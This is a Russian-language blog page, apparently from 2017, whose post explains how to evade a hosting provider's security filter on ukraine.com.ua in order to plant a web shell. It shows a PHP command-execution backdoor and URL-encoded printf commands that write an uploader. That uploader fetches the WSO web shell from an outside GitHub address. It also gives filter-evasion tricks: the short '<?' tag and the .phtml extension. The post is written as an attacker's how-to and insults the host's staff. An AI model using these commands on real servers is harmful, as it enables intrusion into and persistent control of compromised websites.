@@ -1,0 +1,315 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Обход '424 Failed Dependency' на хостингах ukraine.com.ua - Security Idot</title>
+  <meta name="author" content="foozzi">
+
+  
+  <meta name="description" content="Или почему специалисты ukraine.com.ua - идиоты. Сегодня столкнулся с проблемой при попытке взаимодействовать через мини-шелл с файлами на
+сервере, &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://foozzi.github.io/blog/2017/06/26/obkhod-424-failed-dependency-na-khostinghakh-ukraine-dot-com-dot-ua/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Security Idot" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Security Idot</a></h1>
+  
+    <h2>pic.php%00png</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="foozzi.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Обход '424 Failed Dependency' на хостингах ukraine.com.ua</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2017-06-26T16:23:58+00:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>26</span><span class='date-suffix'>th</span>, <span class='date-year'>2017</span></span> <span class='time'>4:23 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Или почему специалисты ukraine.com.ua - идиоты.</p>
+
+<p>Сегодня столкнулся с проблемой при попытке взаимодействовать через мини-шелл с файлами на
+сервере, все это на хостинге <strong>ukraine.com.ua</strong>, а именно:</p>
+
+<ul>
+<li>Нельзя использовать <strong>cat</strong> для просмотра содержимого файлов</li>
+<li>Использовать <strong>rm</strong>, <strong>echo</strong> и подобное</li>
+<li>Команды в адресной строке типа site.ru/shell.php?cmd=echo &lsquo;нужный код&rsquo; > file.php,
+например для загрузки того же <strong>wso</strong>, не проканает и выдаст <strong>424</strong> ошибку безопасности.</li>
+</ul>
+
+
+<h2>Проблема</h2>
+
+<p> Например у меня есть зараженный файл со строкой:
+ <code>php
+echo shell_exec($_GET['cmd']);
+</code>
+ что позволяет казалось бы, спокойно работать с сервером напрямую, но &ldquo;гениальность&rdquo;
+админов ukraine.com.ua работает на злоумышлинника ;)</p>
+
+<p>Чем просмотреть файл? В <strong>*nix</strong> подобных системах, есть еще
+<a href="https://en.wikipedia.org/wiki/Less_%28Unix%29">less</a>, который вполне (и даже в чем то
+лучше) заменит <strong>cat</strong>.</p>
+
+<p>Чем заменить <strong>echo</strong>, а вот тут есть <strong>printf</strong>, который работает аналогично в нашем
+случае:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">printf</span> <span class="s1">&#39;some code&#39;</span> &gt; file.php
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Как залить к примеру,
+<a href="https://raw.githubusercontent.com/tennc/webshell/master/php/wso/wso-4.2.5.php">wso</a>?
+Казалось бы, ничего сложного:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>http://site.ru/shell.php?cmd<span class="o">=</span><span class="nb">printf</span> <span class="s2">&quot;&lt;?php file_put_contents(&#39;wso.php&#39;, </span>
+</span><span class='line'><span class="s2">file_get_contents(&#39;https://raw.githubusercontent.com/tennc/webshell/master/php/wso/wso-4.2.5.php&#39;)); </span>
+</span><span class='line'><span class="s2">?&gt;&quot;</span> &gt; ../../site.ru/uploader_shell.php
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>То есть записываем в файл <strong>uploader_shell.php</strong> php код который скачает и сохранит файл
+шелла. Но при таком подходе нас пошлют в <strong>424</strong>ю ошибку, во первых, хотя бы потому, что в
+строке есть <strong>.php</strong>, и <strong>php4</strong>, <strong>php5</strong> не прокатят, а так же есть <strong>&lt;?php</strong>, что дает
+понять, что кто то замыслил что то плохое ;)</p>
+
+<h2>Решение</h2>
+
+<p>Тут далеко ходить не нужно:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>http://site.ru/shell.php?cmd<span class="o">=</span><span class="nb">printf</span> <span class="s2">&quot;&lt;?file_put_contents(&#39;wso.phtml&#39;, </span>
+</span><span class='line'><span class="s2">file_get_contents(&#39;https://raw.githubusercontent.com/tennc/webshell/master/php/wso/wso-4.2.5.php&#39;));?&gt;&quot;</span>
+</span><span class='line'>&gt; ../../site.ru/uploader_shell.php
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Таким образом мы все же создали загрузчик шелла <strong>uploader_shell.php</strong>, теперь просто стоит
+его вызвать из адресной строки и он сохранит шелл рядом <strong>wso.php</strong>.</p>
+
+<h2>Вывод</h2>
+
+<p>Тех. специалисты ukraine.com.ua еще те идиоты. Лучше бы и не выебываелись.</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">foozzi</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2017-06-26T16:23:58+00:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>26</span><span class='date-suffix'>th</span>, <span class='date-year'>2017</span></span> <span class='time'>4:23 pm</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://foozzi.github.io/blog/2017/06/26/obkhod-424-failed-dependency-na-khostinghakh-ukraine-dot-com-dot-ua/" data-via="foozzi" data-counturl="http://foozzi.github.io/blog/2017/06/26/obkhod-424-failed-dependency-na-khostinghakh-ukraine-dot-com-dot-ua/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2017/06/26/obienniki/" title="Previous Post: Обенники, котовые вы любите">&laquo; Обенники, котовые вы любите</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2017/06/26/obkhod-424-failed-dependency-na-khostinghakh-ukraine-dot-com-dot-ua/">Обход '424 Failed Dependency' на хостингах ukraine.com.ua</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/06/26/obienniki/">Обенники, котовые вы любите</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating...</li>
+  </ul>
+  
+  <a href="https://github.com/foozzi">@foozzi</a> on GitHub
+  
+  <script type="text/javascript">
+    $(document).ready(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'foozzi',
+            count: 5,
+            skip_forks: true,
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2017 - foozzi -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
+<!-- Yandex.Metrika counter -->
+<script type="text/javascript">
+    (function (d, w, c) {
+        (w[c] = w[c] || []).push(function() {
+            try {
+                w.yaCounter45113736 = new Ya.Metrika({
+                    id:45113736,
+                    clickmap:true,
+                    trackLinks:true,
+                    accurateTrackBounce:true,
+                    webvisor:true
+                });
+            } catch(e) { }
+        });
+
+        var n = d.getElementsByTagName("script")[0],
+            s = d.createElement("script"),
+            f = function () { n.parentNode.insertBefore(s, n); };
+        s.type = "text/javascript";
+        s.async = true;
+        s.src = "https://mc.yandex.ru/metrika/watch.js";
+
+        if (w.opera == "[object Opera]") {
+            d.addEventListener("DOMContentLoaded", f, false);
+        } else { f(); }
+    })(document, window, "yandex_metrika_callbacks");
+</script>
+<noscript><div><img src="https://mc.yandex.ru/watch/45113736" style="position:absolute; 
+left:-9999px;" alt="" /></div></noscript>
+<!-- /Yandex.Metrika counter -->
